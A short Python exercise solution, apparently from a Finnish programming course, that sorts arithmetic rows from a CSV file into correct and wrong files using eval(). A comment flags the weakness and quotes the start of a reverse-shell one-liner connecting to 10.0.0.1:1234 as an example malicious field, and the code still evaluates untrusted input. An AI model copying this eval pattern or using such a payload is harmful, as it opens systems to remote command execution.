# tee ratkaisu tänne

def suodata_laskut():
    open('oikeat.csv', 'w').close()
    open('vaarat.csv', 'w').close()
    with open("laskut.csv") as tiedosto:
        for rivi in tiedosto:
            oppilas, lasku, tulos = [x.strip() for x in rivi.split(";")]
            print(oppilas)
            print(lasku)
            print(tulos)
            #this part here is somewhat vulnerable if you write into document
            #some evil shush like "3;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));7"
            print(f"lasku: {eval(lasku)}")
            if(eval(lasku) == float(tulos)):
                with open("oikeat.csv", "a") as oikeat:
                    oikeat.write(rivi)
            else:
                with open("vaarat.csv", "a") as vaarat:
                    vaarat.write(rivi)

    



if __name__ == "__main__":
    suodata_laskut()